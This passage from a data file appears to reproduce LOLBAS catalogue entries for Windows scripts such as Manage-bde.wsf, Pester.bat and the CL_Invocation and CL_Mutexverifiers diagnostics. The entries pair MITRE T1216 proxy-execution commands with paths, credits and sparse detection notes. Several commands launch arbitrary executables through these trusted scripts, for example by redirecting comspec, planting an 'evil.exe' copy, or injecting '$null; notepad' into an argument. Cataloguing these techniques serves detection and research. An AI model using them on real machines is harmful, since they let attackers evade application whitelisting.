                {"Link": "https://twitter.com/bohops/status/994405551751815170"},
                {
                    "Link": "https://posts.specterops.io/application-whitelisting-bypass-and-arbitrary-unsigned-code-execution-technique-in-winrm-vbs-c8c24fb40404"
                },
                {
                    "Link": "https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf"
                },
            ],
            "Acknowledgement": [
                {"Person": "Matt Graeber", "Handle": "AT_SYMBOLmattifestation"},
                {"Person": "Matt Nelson", "Handle": "AT_SYMBOLenigma0x3"},
                {"Person": "Casey Smith", "Handle": "AT_SYMBOLsubtee"},
                {"Person": "Jimmy", "Handle": "AT_SYMBOLbohops"},
                {
                    "Person": "Red Canary Company cc Tony Lambert",
                    "Handle": "AT_SYMBOLredcanaryco",
                },
            ],
            "pname": "winrm",
        },
        {
            "Name": "CL_Mutexverifiers.ps1",
            "Description": None,
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": ". C:\\\\Windows\\\\diagnostics\\\\system\\\\AERO\\\\CL_Mutexverifiers.ps1   \\nrunAfterCancelProcess calc.ps1",
                    "Description": "Import the PowerShell Diagnostic CL_Mutexverifiers script and call runAfterCancelProcess to launch an executable.",
                    "Usecase": "Proxy execution",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1216",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1216",
                    "OperatingSystem": "Windows 10",
                }
            ],
            "Full_Path": [
                {
                    "Path": "C:\\Windows\\diagnostics\\system\\WindowsUpdate\\CL_Mutexverifiers.ps1"
                },
                {
                    "Path": "C:\\Windows\\diagnostics\\system\\Audio\\CL_Mutexverifiers.ps1"
                },
                {
                    "Path": "C:\\Windows\\diagnostics\\system\\WindowsUpdate\\CL_Mutexverifiers.ps1"
                },
                {
                    "Path": "C:\\Windows\\diagnostics\\system\\Video\\CL_Mutexverifiers.ps1"
                },
                {
                    "Path": "C:\\Windows\\diagnostics\\system\\Speech\\CL_Mutexverifiers.ps1"
                },
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": None}],
            "Resources": [
                {"Link": "https://twitter.com/pabraeken/status/995111125447577600"}
            ],
            "Acknowledgement": [
                {"Person": "Pierre-Alexandre Braeken", "Handle": "AT_SYMBOLpabraeken"}
            ],
            "pname": "cl_mutexverifiers",
        },
        {
            "Name": "Manage-bde.wsf",
            "Description": "Script for managing BitLocker",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "set comspec=c:\\windows\\system32\\calc.exe & cscript c:\\windows\\system32\\manage-bde.wsf",
                    "Description": "Set the comspec variable to another executable prior to calling manage-bde.wsf for execution.",
                    "Usecase": "Proxy execution from script",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1216",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1216",
                    "OperatingSystem": "Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": "copy c:\\users\\person\\evil.exe c:\\users\\public\\manage-bde.exe & cd c:\\users\\public\\ & cscript.exe c:\\windows\\system32\\manage-bde.wsf",
                    "Description": "Run the manage-bde.wsf script with a payload named manage-bde.exe in the same directory to run the payload file.",
                    "Usecase": "Proxy execution from script",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1216",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1216",
                    "OperatingSystem": "Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
            ],
            "Full_Path": [{"Path": "C:\\Windows\\System32\\manage-bde.wsf"}],
            "Code_Sample": [{"Code": None}],
            "Detection": [
                {"IOC": "Manage-bde.wsf should normally not be invoked by a user"}
            ],
            "Resources": [
                {
                    "Link": "https://gist.github.com/bohops/735edb7494fe1bd1010d67823842b712"
                },
                {"Link": "https://twitter.com/bohops/status/980659399495741441"},
                {"Link": "https://twitter.com/JohnLaTwC/status/1223292479270600706"},
            ],
            "Acknowledgement": [
                {"Person": "Jimmy", "Handle": "AT_SYMBOLbohops"},
                {"Person": "Daniel Bohannon", "Handle": "AT_SYMBOLdanielbohannon"},
                {"Person": "John Lambert", "Handle": "AT_SYMBOLJohnLaTwC"},
            ],
            "pname": "manage-bde",
        },
        {
            "Name": "Pester.bat",
            "Description": "Used as part of the Powershell pester",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": 'Pester.bat [/help|?|-?|/?] "$null; notepad"',
                    "Description": "Execute code using Pester. The third parameter can be anything. The fourth is the payload. Example here executes notepad",
                    "Usecase": "Proxy execution",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1216",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1216",
                    "OperatingSystem": "Windows 10",
                }
            ],
            "Full_Path": [
                {
                    "Path": "c:\\Program Files\\WindowsPowerShell\\Modules\\Pester\\3.4.0\\bin\\Pester.bat"
                },
                {
                    "Path": "c:\\Program Files\\WindowsPowerShell\\Modules\\Pester\\*\\bin\\Pester.bat"
                },
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": None}],
            "Resources": [
                {"Link": "https://twitter.com/Oddvarmoe/status/993383596244258816"}
            ],
            "Acknowledgement": [
                {"Person": "Emin Atac", "Handle": "AT_SYMBOLp0w3rsh3ll"}
            ],
            "pname": "pester",
        },
        {
            "Name": "CL_Invocation.ps1",
            "Description": "Aero diagnostics script",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": ". C:\\\\Windows\\\\diagnostics\\\\system\\\\AERO\\\\CL_Invocation.ps1   \\nSyncInvoke <executable> [args]",
                    "Description": "Import the PowerShell Diagnostic CL_Invocation script and call SyncInvoke to launch an executable.",
                    "Usecase": "Proxy execution",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1216",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1216",
                    "OperatingSystem": "Windows 10",
                }
            ],
            "Full_Path": [
                {"Path": "C:\\Windows\\diagnostics\\system\\AERO\\CL_Invocation.ps1"},
                {"Path": "C:\\Windows\\diagnostics\\system\\Audio\\CL_Invocation.ps1"},
                {
                    "Path": "C:\\Windows\\diagnostics\\system\\WindowsUpdate\\CL_Invocation.ps1"
                },
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": None}],
            "Resources": [{"Link": None}],
            "Acknowledgement": [
                {"Person": "Jimmy", "Handle": "AT_SYMBOLbohops"},
                {"Person": "Pierre-Alexandre Braeken", "Handle": "AT_SYMBOLpabraeken"},
            ],
            "pname": "cl_invocation",
        },
    ],
}
